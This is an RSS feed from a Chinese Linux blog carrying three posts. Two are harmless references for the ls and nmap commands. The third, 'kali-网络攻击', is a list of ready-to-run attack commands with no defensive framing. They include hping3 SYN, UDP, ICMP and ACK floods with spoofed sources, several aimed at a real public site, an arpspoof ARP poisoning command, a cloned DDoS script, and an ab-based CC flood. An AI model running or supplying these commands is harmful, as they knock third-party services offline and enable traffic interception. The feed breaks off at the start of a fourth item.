<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>Linux归档 - 时空之歌</title>
	<atom:link href="/archives/category/it/linux/feed" rel="self" type="application/rss+xml" />
	<link>/archives/category/it/linux</link>
	<description>我们都是阴沟里的虫子，但总还是得有人仰望星空。</description>
	<lastBuildDate>Fri, 20 Jan 2023 03:18:35 +0000</lastBuildDate>
	<language>zh-CN</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.4.2</generator>

<image>
	<url>/wp-content/uploads/2023/03/cropped-63e512384757feff33d9afcf-1-150x150.jpg</url>
	<title>Linux归档 - 时空之歌</title>
	<link>/archives/category/it/linux</link>
	<width>32</width>
	<height>32</height>
</image> 
	<item>
		<title>Linux-ls</title>
		<link>/archives/462</link>
					<comments>/archives/462#respond</comments>
		
		<dc:creator><![CDATA[Space520]]></dc:creator>
		<pubDate>Fri, 20 Jan 2023 03:18:35 +0000</pubDate>
				<category><![CDATA[IT]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[文章]]></category>
		<guid isPermaLink="false">http://space520.42web.io/?p=462</guid>

					<description><![CDATA[<p>ls 显示目录内容列表 补充说明 ls命令&#160;就是list的缩写，用来显示目标列表，在Linux中是使 [&#8230;]</p>
<p><a href="/archives/462">Linux-ls</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></description>
										<content:encoded><![CDATA[
<h1 class="wp-block-heading" id="ls"><a href="https://linux.lylme.com/c/ls.html#ls"></a>ls</h1>



<p>显示目录内容列表</p>



<h2 class="wp-block-heading" id="补充说明"><a href="https://linux.lylme.com/c/ls.html#%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"></a>补充说明</h2>



<p><strong>ls命令</strong>&nbsp;就是list的缩写，用来显示目标列表，在Linux中是使用率较高的命令。ls命令的输出信息可以进行彩色加亮显示，以分区不同类型的文件。</p>



<h3 class="wp-block-heading" id="语法"><a href="https://linux.lylme.com/c/ls.html#%E8%AF%AD%E6%B3%95"></a>语法</h3>



<pre class="wp-block-code"><code>ls &#91;选项] &#91;文件名...]
   &#91;-1abcdfgiklmnopqrstuxABCDFGLNQRSUX] &#91;-w cols] &#91;-T cols] &#91;-I pattern] &#91;--full-time] 
   &#91;--format={long,verbose,commas,across,vertical,single-col‐umn}] 
   &#91;--sort={none,time,size,extension}] &#91;--time={atime,access,use,ctime,status}] 
   &#91;--color&#91;={none,auto,always}]] &#91;--help] &#91;--version] &#91;--]
</code></pre>



<h3 class="wp-block-heading" id="选项"><a href="https://linux.lylme.com/c/ls.html#%E9%80%89%E9%A1%B9"></a>选项</h3>



<pre class="wp-block-code"><code>-C     # 多列输出，纵向排序。
-F     # 每个目录名加 "/" 后缀，每个 FIFO 名加 "|" 后缀， 每个可运行名加“ * ”后缀。
-R     # 递归列出遇到的子目录。
-a     # 列出所有文件，包括以 "." 开头的隐含文件。
-c     # 使用“状态改变时间”代替“文件修改时间”为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。
-d     # 将目录名像其它文件一样列出，而不是列出它们的内容。
-i     # 输出文件前先输出文件系列号（即 i 节点号: i-node number）。 -l  列出（以单列格式）文件模式
       # （file mode），文件的链接数，所有者名，组名，文件大小（以字节为单位），时间信息，及文件名。
       # 缺省时，时间信息显示最近修改时间；可以以选项“-c”和“-u”选择显示其它两种时间信息。对于设备文件，
       # 原先显示文件大小的区域通常显示的是主要和次要的信号（majorand minor device numbers）。
-q     # 将文件名中的非打印字符输出为问号。（对于到终端的输出这是缺省的。）
-r     # 逆序排列。
-t     # 按时间信息排序。
-u     # 使用最近访问时间代替最近修改时间为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。
-1     # 单列输出。
-1, --format=single-column  # 一行输出一个文件（单列输出）。如标准输出不是到终端，此选项就是缺省选项。
-a, --all # 列出目录中所有文件，包括以“.”开头的文件。
-b, --escape # 把文件名中不可输出的字符用反斜杠加字符编号(就像在 C 语言里一样)的形式列出。
-c, --time=ctime, --time=status
      # 按文件状态改变时间（i节点中的ctime）排序并输出目录内
      # 容。如采用长格式输出（选项“-l”），使用文件的状态改
      # 变时间取代文件修改时间。【译注：所谓文件状态改变（i节
      # 点中以ctime标志），既包括文件被修改，又包括文件属性（ 如所有者、组、链接数等等）的变化】
-d, --directory
      # 将目录名像其它文件一样列出，而不是列出它们的内容。
-f    # 不排序目录内容；按它们在磁盘上存储的顺序列出。同时启 动“ -a ”选项，如果在“ -f ”之前存在“ -l”、
      # “ - -color ”或“ -s ”，则禁止它们。
-g    # 忽略，为兼容UNIX用。
-i, --inode
      # 在每个文件左边打印  i  节点号（也叫文件序列号和索引号:  file  serial  number and index num‐
      # ber）。i节点号在每个特定的文件系统中是唯一的。
-k, --kilobytes
      # 如列出文件大小，则以千字节KB为单位。
-l, --format=long, --format=verbose
      # 输出的信息从左到右依次包括文件名、文件类型、权限、硬链接数、所有者名、组名、大小（byte）
      # 、及时间信息（如未指明是其它时间即指修改时间）。对于6个月以上的文件或超出未来
      # 1小时的文件，时间信息中的时分将被年代取代。
      # 每个目录列出前，有一行“总块数”显示目录下全部文件所占的磁盘空间。块默认是1024字节；
      # 如果设置了 POSIXLY_CORRECT 的环境变量，除非用“-k”选项，则默认块大小是 512 字节。
      # 每一个硬链接都计入总块数（因此可能重复计数），这无 疑是个缺点。

# 列出的权限类似于以符号表示（文件）模式的规范。但是 ls
      # 在每套权限的第三个字符中结合了多位（ multiple bits ） 的信息，如下： s 如果设置了  setuid
      # 位或 setgid   位，而且也设置了相应的可执行位。 S 如果设置了 setuid 位或 setgid
      # 位，但是没有设置相应的可执行位。 t 如果设置了  sticky  位，而且也设置了相应的可执行位。  T
      # 如果设置了 sticky 位，但是没有设置相应的可执行位。              x
      # 如果仅仅设置了可执行位而非以上四种情况。 - 其它情况（即可执行位未设置）。
-m, --format=commas
      # 水平列出文件，每行尽可能多，相互用逗号和一个空格分隔。
-n, --numeric-uid-gid
      # 列出数字化的 UID 和 GID 而不是用户名和组名。
-o    #  以长格式列出目录内容，但是不显示组信息。等于使用“         --format=long          --no-group
      # ”选项。提供此选项是为了与其它版本的 ls 兼容。
-p    #  在每个文件名后附上一个字符以说明该文件的类型。类似“ -F ”选项但是不 标示可执行文件。
-q, --hide-control-chars
      # 用问号代替文件名中非打印的字符。这是缺省选项。
-r, --reverse
      # 逆序排列目录内容。
-s, --size
      # 在每个文件名左侧输出该文件的大小，以    1024   字节的块为单位。如果设置了   POSIXLY_CORRECT
      # 的环境变量，除非用“ -k ”选项，块大小是 512 字节。
-t, --sort=time
      # 按文件最近修改时间（ i 节点中的 mtime ）而不是按文件名字典序排序，新文件 靠前。
-u, --time=atime, --time=access, --time=use
      # 类似选项“    -t    ”，但是用文件最近访问时间（    i     节点中的     atime     ）取代文件修
      # 改时间。如果使用长格式列出，打印的时间是最近访问时间。
-w, --width cols
       # 假定屏幕宽度是      cols      （      cols     以实际数字取代）列。如未用此选项，缺省值是这
       # 样获得的：如可能先尝试取自终端驱动，否则尝试取自环境变量          COLUMNS          （如果设
       # 置了的话），都不行则取 80 。

-x, --format=across, --format=horizontal
       # 多列输出，横向排序。

-A, --almost-all
       # 显示除 "." 和 ".." 外的所有文件。

-B, --ignore-backups
       # 不输出以“ ~ ”结尾的备份文件，除非已经在命令行中给出。

-C, --format=vertical
       # 多列输出，纵向排序。当标准输出是终端时这是缺省项。使用命令名 dir 和 d 时， 则总是缺省的。

-D, --dired
       # 当采用长格式（“-l”选项）输出时，在主要输出后，额外打印一行：  //DIRED//  BEG1 END1 BEG2
       # END2 ...

# BEGn 和 ENDn 是无符号整数，记录每个文件名的起始、结束位置在输出中的位置（
#        字节偏移量）。这使得          Emacs          易于找到文件名，即使文件名包含空格或换行等非正
#        常字符也无需特异的搜索。
# 
# 如果目录是递归列出的（“ -R ”选项），每个子目录后列出类似一行：
       # //SUBDIRED//  BEG1 END1 ...  【译注：我测试了 TurboLinux4.0 和 RedHat6.1 ，发现它们都是在 “
       # //DIRED//     BEG1...     ”之后列出“     //SUBDIRED//     BEG1     ...      ”，也即只有一个
       # 而不是在每个子目录后都有。而且“ //SUBDIRED// BEG1 ... ”列出的是各个子目 录名的偏移。】

-F, --classify, --file-type
       # 在每个文件名后附上一个字符以说明该文件的类型。“  * ”表示普通的可执行文件； “ / ”表示目录；“
       # @ ”表示符号链接；“ | ”表示FIFOs；“ = ”表示套接字 (sockets) ；什么也没有则表示普通文件。

-G, --no-group
       # 以长格式列目录时不显示组信息。

-I, --ignorepattern
       # 除非在命令行中给定，不要列出匹配shell文件名匹配式（pattern ，不是指一般
       # 表达式）的文件。在shell中，文件名以"."起始的不与在文件名匹配式(pattern)
       # 开头的通配符匹配。

-L, --dereference
       # 列出符号链接指向的文件的信息，而不是符号链接本身。

-N, --literal
       # 不要用引号引起文件名。

-Q, --quote-name
       # 用双引号引起文件名，非打印字符以 C 语言的方法表示。

-R, --recursive
       # 递归列出全部目录的内容。

-S, --sort=size
       # 按文件大小而不是字典序排序目录内容，大文件靠前。

-T, --tabsize cols
       # 假定每个制表符宽度是 cols 。缺省为 8。为求效率， ls 可能在输出中使用制表符。  若 cols 为
       0，则不使用制表符。

-U, --sort=none
       # 不排序目录内容；按它们在磁盘上存储的顺序列出。（选项“-U”和“-f”的不
       # 同是前者不启动或禁止相关的选项。）这在列很大的目录时特别有用，因为不加排序
       # 能显著地加快速度。

-X, --sort=extension
       # 按文件扩展名（由最后的 "." 之后的字符组成）的字典序排序。没有扩展名的先列 出。

--color&#91;=when]
       # 指定是否使用颜色区别文件类别。环境变量  LS_COLORS  指定使用的颜色。如何设置 这个变量见 dir‐
       # colors(1) 。 when 可以被省略，或是以下几项之一：
none # 不使用颜色，这是缺省项。
       # auto 仅当标准输出是终端时使用。 always 总是使用颜色。指定 --color 而且省略 when  时就等同于
       # --color=always 。

--full-time
       # 列出完整的时间，而不是使用标准的缩写。格式如同          date(1)          的缺省格式；此格式
       # 是不能改变的，但是你可以用 cut(1) 取出其中的日期字串并将结果送至命令 “ date -d ”。

# 输出的时间包括秒是非常有用的。（ Unix 文件系统储存文件的时间信息精确到秒，
       # 因此这个选项已经给出了系统所知的全部信息。）例如，当你有一个         Makefile          文件
       # 不能恰当地生成文件时，这个选项会提供帮助。
</code></pre>



<h3 class="wp-block-heading" id="参数"><a href="https://linux.lylme.com/c/ls.html#%E5%8F%82%E6%95%B0"></a>参数</h3>



<p>目录：指定要显示列表的目录，也可以是具体的文件。</p>



<h3 class="wp-block-heading" id="实例"><a href="https://linux.lylme.com/c/ls.html#%E5%AE%9E%E4%BE%8B"></a>实例</h3>



<pre class="wp-block-code"><code>$ ls       # 仅列出当前目录可见文件
$ ls -l    # 列出当前目录可见文件详细信息
$ ls -hl   # 列出详细信息并以可读大小显示文件大小
$ ls -al   # 列出所有文件（包括隐藏）的详细信息
$ ls --human-readable --size -1 -S --classify # 按文件大小排序
$ du -sh * | sort -h # 按文件大小排序(同上)
</code></pre>



<p>显示当前目录下包括隐藏文件在内的所有文件列表</p>



<pre class="wp-block-code"><code>&#91;root@localhost ~]# ls -a
.   anaconda-ks.cfg  .bash_logout   .bashrc  install.log         .mysql_history  satools  .tcshrc   .vimrc
..  .bash_history    .bash_profile  .cshrc   install.log.syslog  .rnd            .ssh     .viminfo
</code></pre>



<p>输出长格式列表</p>



<pre class="wp-block-code"><code>&#91;root@localhost ~]# ls -1

anaconda-ks.cfg
install.log
install.log.syslog
satools
</code></pre>



<p>显示文件的inode信息</p>



<p>索引节点（index inode简称为“inode”）是Linux中一个特殊的概念，具有相同的索引节点号的两个文本本质上是同一个文件（除文件名不同外）。</p>



<pre class="wp-block-code"><code>&#91;root@localhost ~]# ls -i -l anaconda-ks.cfg install.log
2345481 -rw------- 1 root root   859 Jun 11 22:49 anaconda-ks.cfg
2345474 -rw-r--r-- 1 root root 13837 Jun 11 22:49 install.log
</code></pre>



<p>水平输出文件列表</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -m

bin, boot, data, dev, etc, home, lib, lost+found, media, misc, mnt, opt, proc, root, sbin, selinux, srv, sys, tmp, usr, var
</code></pre>



<p>修改最后一次编辑的文件</p>



<p>最近修改的文件显示在最上面。</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -t

tmp  root  etc  dev  lib  boot  sys  proc  data  home  bin  sbin  usr  var  lost+found  media  mnt  opt  selinux  srv  misc
</code></pre>



<p>显示递归文件</p>



<pre class="wp-block-code"><code>&#91;root@localhost ~]# ls -R
.:
anaconda-ks.cfg  install.log  install.log.syslog  satools

./satools:
black.txt  freemem.sh  iptables.sh  lnmp.sh  mysql  php502_check.sh  ssh_safe.sh
</code></pre>



<p>打印文件的UID和GID</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -n

total 254
drwxr-xr-x   2 0 0  4096 Jun 12 04:03 bin
drwxr-xr-x   4 0 0  1024 Jun 15 14:45 boot
drwxr-xr-x   6 0 0  4096 Jun 12 10:26 data
drwxr-xr-x  10 0 0  3520 Sep 26 15:38 dev
drwxr-xr-x  75 0 0  4096 Oct 16 04:02 etc
drwxr-xr-x   4 0 0  4096 Jun 12 10:26 home
drwxr-xr-x  14 0 0 12288 Jun 16 04:02 lib
drwx------   2 0 0 16384 Jun 11 22:46 lost+found
drwxr-xr-x   2 0 0  4096 May 11  2011 media
drwxr-xr-x   2 0 0  4096 Nov  8  2010 misc
drwxr-xr-x   2 0 0  4096 May 11  2011 mnt
drwxr-xr-x   2 0 0  4096 May 11  2011 opt
dr-xr-xr-x 232 0 0     0 Jun 15 11:04 proc
drwxr-x---   4 0 0  4096 Oct 15 14:43 root
drwxr-xr-x   2 0 0 12288 Jun 12 04:03 sbin
drwxr-xr-x   2 0 0  4096 May 11  2011 selinux
drwxr-xr-x   2 0 0  4096 May 11  2011 srv
drwxr-xr-x  11 0 0     0 Jun 15 11:04 sys
drwxrwxrwt   3 0 0 98304 Oct 16 08:45 tmp
drwxr-xr-x  13 0 0  4096 Jun 11 23:38 usr
drwxr-xr-x  19 0 0  4096 Jun 11 23:38 var
</code></pre>



<p>列出文件和文件夹的详细信息</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -l

total 254
drwxr-xr-x   2 root root  4096 Jun 12 04:03 bin
drwxr-xr-x   4 root root  1024 Jun 15 14:45 boot
drwxr-xr-x   6 root root  4096 Jun 12 10:26 data
drwxr-xr-x  10 root root  3520 Sep 26 15:38 dev
drwxr-xr-x  75 root root  4096 Oct 16 04:02 etc
drwxr-xr-x   4 root root  4096 Jun 12 10:26 home
drwxr-xr-x  14 root root 12288 Jun 16 04:02 lib
drwx------   2 root root 16384 Jun 11 22:46 lost+found
drwxr-xr-x   2 root root  4096 May 11  2011 media
drwxr-xr-x   2 root root  4096 Nov  8  2010 misc
drwxr-xr-x   2 root root  4096 May 11  2011 mnt
drwxr-xr-x   2 root root  4096 May 11  2011 opt
dr-xr-xr-x 232 root root     0 Jun 15 11:04 proc
drwxr-x---   4 root root  4096 Oct 15 14:43 root
drwxr-xr-x   2 root root 12288 Jun 12 04:03 sbin
drwxr-xr-x   2 root root  4096 May 11  2011 selinux
drwxr-xr-x   2 root root  4096 May 11  2011 srv
drwxr-xr-x  11 root root     0 Jun 15 11:04 sys
drwxrwxrwt   3 root root 98304 Oct 16 08:48 tmp
drwxr-xr-x  13 root root  4096 Jun 11 23:38 usr
drwxr-xr-x  19 root root  4096 Jun 11 23:38 var
</code></pre>



<p>列出可读文件和文件夹详细信息</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -lh

total 254K
drwxr-xr-x   2 root root 4.0K Jun 12 04:03 bin
drwxr-xr-x   4 root root 1.0K Jun 15 14:45 boot
drwxr-xr-x   6 root root 4.0K Jun 12 10:26 data
drwxr-xr-x  10 root root 3.5K Sep 26 15:38 dev
drwxr-xr-x  75 root root 4.0K Oct 16 04:02 etc
drwxr-xr-x   4 root root 4.0K Jun 12 10:26 home
drwxr-xr-x  14 root root  12K Jun 16 04:02 lib
drwx------   2 root root  16K Jun 11 22:46 lost+found
drwxr-xr-x   2 root root 4.0K May 11  2011 media
drwxr-xr-x   2 root root 4.0K Nov  8  2010 misc
drwxr-xr-x   2 root root 4.0K May 11  2011 mnt
drwxr-xr-x   2 root root 4.0K May 11  2011 opt
dr-xr-xr-x 235 root root    0 Jun 15 11:04 proc
drwxr-x---   4 root root 4.0K Oct 15 14:43 root
drwxr-xr-x   2 root root  12K Jun 12 04:03 sbin
drwxr-xr-x   2 root root 4.0K May 11  2011 selinux
drwxr-xr-x   2 root root 4.0K May 11  2011 srv
drwxr-xr-x  11 root root    0 Jun 15 11:04 sys
drwxrwxrwt   3 root root  96K Oct 16 08:49 tmp
drwxr-xr-x  13 root root 4.0K Jun 11 23:38 usr
drwxr-xr-x  19 root root 4.0K Jun 11 23:38 var
</code></pre>



<p>显示文件夹信息</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -ld /etc/

drwxr-xr-x 75 root root 4096 Oct 16 04:02 /etc/
</code></pre>



<p>按时间列出文件和文件夹详细信息</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -lt

total 254
drwxrwxrwt   3 root root 98304 Oct 16 08:53 tmp
drwxr-xr-x  75 root root  4096 Oct 16 04:02 etc
drwxr-x---   4 root root  4096 Oct 15 14:43 root
drwxr-xr-x  10 root root  3520 Sep 26 15:38 dev
drwxr-xr-x  14 root root 12288 Jun 16 04:02 lib
drwxr-xr-x   4 root root  1024 Jun 15 14:45 boot
drwxr-xr-x  11 root root     0 Jun 15 11:04 sys
dr-xr-xr-x 232 root root     0 Jun 15 11:04 proc
drwxr-xr-x   6 root root  4096 Jun 12 10:26 data
drwxr-xr-x   4 root root  4096 Jun 12 10:26 home
drwxr-xr-x   2 root root  4096 Jun 12 04:03 bin
drwxr-xr-x   2 root root 12288 Jun 12 04:03 sbin
drwxr-xr-x  13 root root  4096 Jun 11 23:38 usr
drwxr-xr-x  19 root root  4096 Jun 11 23:38 var
drwx------   2 root root 16384 Jun 11 22:46 lost+found
drwxr-xr-x   2 root root  4096 May 11  2011 media
drwxr-xr-x   2 root root  4096 May 11  2011 mnt
drwxr-xr-x   2 root root  4096 May 11  2011 opt
drwxr-xr-x   2 root root  4096 May 11  2011 selinux
drwxr-xr-x   2 root root  4096 May 11  2011 srv
drwxr-xr-x   2 root root  4096 Nov  8  2010 misc
</code></pre>



<p>按修改时间列出文件和文件夹详细信息</p>



<pre class="wp-block-code"><code>&#91;root@localhost /]# ls -ltr

total 254
drwxr-xr-x   2 root root 4096 Nov  8  2010 misc
drwxr-xr-x   2 root root  4096 May 11  2011 srv
drwxr-xr-x   2 root root  4096 May 11  2011 selinux
drwxr-xr-x   2 root root  4096 May 11  2011 opt
drwxr-xr-x   2 root root  4096 May 11  2011 mnt
drwxr-xr-x   2 root root  4096 May 11  2011 media
drwx------   2 root root 16384 Jun 11 22:46 lost+found
drwxr-xr-x  19 root root  4096 Jun 11 23:38 var
drwxr-xr-x  13 root root  4096 Jun 11 23:38 usr
drwxr-xr-x   2 root root 12288 Jun 12 04:03 sbin
drwxr-xr-x   2 root root  4096 Jun 12 04:03 bin
drwxr-xr-x   4 root root  4096 Jun 12 10:26 home
drwxr-xr-x   6 root root  4096 Jun 12 10:26 data
dr-xr-xr-x 232 root root     0 Jun 15 11:04 proc
drwxr-xr-x  11 root root     0 Jun 15 11:04 sys
drwxr-xr-x   4 root root  1024 Jun 15 14:45 boot
drwxr-xr-x  14 root root 12288 Jun 16 04:02 lib
drwxr-xr-x  10 root root  3520 Sep 26 15:38 dev
drwxr-x---   4 root root  4096 Oct 15 14:43 root
drwxr-xr-x  75 root root  4096 Oct 16 04:02 etc
drwxrwxrwt   3 root root 98304 Oct 16 08:54 tmp
</code></pre>



<p>按照特殊字符对文件进行分类</p>



<pre class="wp-block-code"><code>&#91;root@localhost nginx-1.2.1]# ls -F

auto/  CHANGES  CHANGES.ru  conf/  configure*  contrib/  html/  LICENSE  Makefile  man/  objs/  README  src/
</code></pre>



<p>列出文件并标记颜色分类</p>



<pre class="wp-block-code"><code>&#91;root@localhost nginx-1.2.1]# ls --color=auto

auto  CHANGES  CHANGES.ru  conf  configure  contrib  html  LICENSE  Makefile  man  objs  README  src
</code></pre>



<h2 class="wp-block-heading" id="扩展知识"><a href="https://linux.lylme.com/c/ls.html#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86"></a>扩展知识</h2>



<h3 class="wp-block-heading" id="不同颜色代表的文件类型"><a href="https://linux.lylme.com/c/ls.html#%E4%B8%8D%E5%90%8C%E9%A2%9C%E8%89%B2%E4%BB%A3%E8%A1%A8%E7%9A%84%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"></a>不同颜色代表的文件类型</h3>



<ul>
<li><code><mark style="background-color:#0693e3" class="has-inline-color">蓝色</mark></code>：目录</li>



<li><code><mark style="background-color:#00d084" class="has-inline-color">绿色</mark></code>：可执行文件</li>



<li><code><mark style="background-color:#ffffff" class="has-inline-color">白色</mark></code>：一般性文件，如文本文件，配置文件等</li>



<li><code>红色</code>：压缩文件或归档文件</li>



<li><code>浅蓝色</code>：链接文件</li>



<li>红色闪烁：链接文件存在问题</li>



<li>黄色：设备文件</li>



<li>青黄色：管道文件</li>
</ul>
<p><a href="/archives/462">Linux-ls</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></content:encoded>
					
					<wfw:commentRss>/archives/462/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>kali-网络攻击</title>
		<link>/archives/467</link>
					<comments>/archives/467#respond</comments>
		
		<dc:creator><![CDATA[Space520]]></dc:creator>
		<pubDate>Mon, 16 Jan 2023 15:42:10 +0000</pubDate>
				<category><![CDATA[Hacker]]></category>
		<category><![CDATA[IT]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[文章]]></category>
		<category><![CDATA[hacker]]></category>
		<guid isPermaLink="false">http://space520.42web.io/?p=467</guid>

					<description><![CDATA[<p>一、sys flood 原文：https://blog.csdn.net/weixin_51685970/ar [&#8230;]</p>
<p><a href="/archives/467">kali-网络攻击</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></description>
										<content:encoded><![CDATA[
<h2 class="wp-block-heading">一、sys flood </h2>



<p>原文：<a rel="noreferrer noopener" href="https://blog.csdn.net/weixin_51685970/article/details/123789009" target="_blank">https://blog.csdn.net/weixin_51685970/article/details/123789009</a></p>



<pre class="wp-block-code"><code>hping3 -q -n -a 攻击ip -S -s 源端口 --keep -p 目的端口 --flood 被攻击IP</code></pre>



<h3 class="wp-block-heading">示例：</h3>



<pre class="wp-block-code"><code>hping3 -q -n -a 192.168.0.10 -S -s 585 --keep -p 1058 --flood 192.168.0.100</code></pre>



<h2 class="wp-block-heading">二、拒绝服务攻击</h2>



<p>使用 Hping3 可以很方便构建拒绝服务攻击。比如对目标机发起大量 SYN 连接，伪造源地址为 192.168.10.99，并使用1000微秒的间隔发送各个 SYN 包：</p>



<h3 class="wp-block-heading">示例：</h3>



<pre class="wp-block-code"><code>hping3 -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000</code></pre>



<h2 class="wp-block-heading">三、DDOS攻击 (分布式拒绝服务攻击)</h2>



<h3 class="wp-block-heading">1.UDP ddos攻击：</h3>



<pre class="wp-block-code"><code><br>hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>



<h3 class="wp-block-heading">2.ICMP ddos攻击：</h3>



<pre class="wp-block-code"><code>hping3 -c 10000 -d 120 --icmp -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>



<h3 class="wp-block-heading">3.SYN ddos攻击：</h3>



<pre class="wp-block-code"><code>hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>



<h3 class="wp-block-heading">4.ACK ddos攻击：</h3>



<pre class="wp-block-code"><code>hping3 -c 10000 -d 120 -A -w 64 -p 80 --flood --rand-source www.baidu.com</code></pre>



<h2 class="wp-block-heading">四、arp攻击</h2>



<h3 class="wp-block-heading">语法：</h3>



<pre class="wp-block-code"><code>arpspoof -i 你的网卡名称 -t 攻击目标的IP地址 攻击目标的网关地址</code></pre>



<pre class="wp-block-code"><code>arpspoof -i eth0 -t 192.168.0.100 192.168.0.1</code></pre>



<h2 class="wp-block-heading">五、DDOS攻击(2) </h2>



<h3 class="wp-block-heading">1.下载DDos的数据包</h3>



<pre class="wp-block-code"><code>git clone https://github.com/Andysun06/ddos</code></pre>



<h3 class="wp-block-heading">2.进入你所下载的DDos文件夹</h3>



<pre class="wp-block-code"><code>cd ddos</code></pre>



<h3 class="wp-block-heading">3.运行 </h3>



<pre class="wp-block-code"><code>python ddos-p2.py</code></pre>



<p> Attack Port即攻击端口，一般服务器默认为80（更多内容请百度） </p>



<p>Attack Speed即攻击速度，数值越大越快，最大不能超过1000 </p>



<h2 class="wp-block-heading">六、CC攻击</h2>



<pre class="wp-block-code"><code>ab -n 参数1 -c 参数2 网站地址</code></pre>



<p>参数一是并发数（请求的用户量）<br>参数二是发送总量（请求的总次数）<br>（有兴趣的可以在百度上另外学习）<br>参数1，参数2和网站地址由自己设置，这里以 1000，1000，</p>
<p><a href="/archives/467">kali-网络攻击</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></content:encoded>
					
					<wfw:commentRss>/archives/467/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Linux-nmap</title>
		<link>/archives/443</link>
					<comments>/archives/443#respond</comments>
		
		<dc:creator><![CDATA[Space520]]></dc:creator>
		<pubDate>Mon, 16 Jan 2023 14:40:54 +0000</pubDate>
				<category><![CDATA[IT]]></category>
		<category><![CDATA[Linux]]></category>
		<category><![CDATA[文章]]></category>
		<guid isPermaLink="false">http://space520.42web.io/?p=443</guid>

					<description><![CDATA[<p>nmap 网络探测和安全审核 补充说明 nmap命令&#160;是一款开放源代码的网络探测和安全审核工具，它的 [&#8230;]</p>
<p><a href="/archives/443">Linux-nmap</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></description>
										<content:encoded><![CDATA[
<h1 class="wp-block-heading" id="nmap"><a href="https://linux.lylme.com/c/nmap.html#nmap"></a>nmap</h1>



<p>网络探测和安全审核</p>



<h2 class="wp-block-heading" id="补充说明"><a href="https://linux.lylme.com/c/nmap.html#%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E"></a>补充说明</h2>



<p><strong>nmap命令</strong>&nbsp;是一款开放源代码的网络探测和安全审核工具，它的设计目标是快速地扫描大型网络。</p>



<h3 class="wp-block-heading" id="语法"><a href="https://linux.lylme.com/c/nmap.html#%E8%AF%AD%E6%B3%95"></a>语法</h3>



<pre class="wp-block-code"><code>nmap(选项)(参数)
</code></pre>



<h3 class="wp-block-heading" id="选项"><a href="https://linux.lylme.com/c/nmap.html#%E9%80%89%E9%A1%B9"></a>选项</h3>



<pre class="wp-block-code"><code>-O：激活操作探测；
-P0：值进行扫描，不ping主机；
-PT：是同TCP的ping；
-sV：探测服务版本信息；
-sP：ping扫描，仅发现目标主机是否存活；
-ps：发送同步（SYN）报文；
-PU：发送udp ping；
-PE：强制执行直接的ICMPping；
-PB：默认模式，可以使用ICMPping和TCPping；
-6：使用IPv6地址；
-v：得到更多选项信息；
-d：增加调试信息地输出；
-oN：以人们可阅读的格式输出；
-oX：以xml格式向指定文件输出信息；
-oM：以机器可阅读的格式输出；
-A：使用所有高级扫描选项；
--resume：继续上次执行完的扫描；
-P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围；
-e：在多网络接口Linux系统中，指定扫描使用的网络接口；
-g：将指定的端口作为源端口进行扫描；
--ttl：指定发送的扫描报文的生存期；
--packet-trace：显示扫描过程中收发报文统计；
--scanflags：设置在扫描报文中的TCP标志。
--send-eth/--send-ip 使用原始以太网发送/构造指定IP发送
</code></pre>



<h3 class="wp-block-heading" id="参数"><a href="https://linux.lylme.com/c/nmap.html#%E5%8F%82%E6%95%B0"></a>参数</h3>



<p>ip地址：指定待扫描报文中的TCP地址。</p>



<h3 class="wp-block-heading" id="实例"><a href="https://linux.lylme.com/c/nmap.html#%E5%AE%9E%E4%BE%8B"></a>实例</h3>



<p><strong>安装nmap</strong></p>



<pre class="wp-block-code"><code>yum install nmap
</code></pre>



<p><strong>使用nmap扫描www.jsdig.com的开放端口</strong></p>



<pre class="wp-block-code"><code>&#91;root@localhost ~]# nmap www.jsdig.com

Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-12-28 00:06 CST
Interesting ports on 100-42-212-8.static.webnx.com (100.42.212.8):
Not shown: 1678 filtered ports
PORT   STATE service
22/tcp open  ssh
80/tcp open  http

Nmap finished: 1 IP address (1 host up) scanned in 45.870 seconds</code></pre>
<p><a href="/archives/443">Linux-nmap</a>最先出现在<a href="/">时空之歌</a>。</p>
]]></content:encoded>
					
					<wfw:commentRss>/archives/443/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Linux-hping3</title>
		<link>/archives/441</link>
					<comments>/archives/441#respond</comments>
		
		<dc:creator><![CDATA[Space520]]></dc:creator>
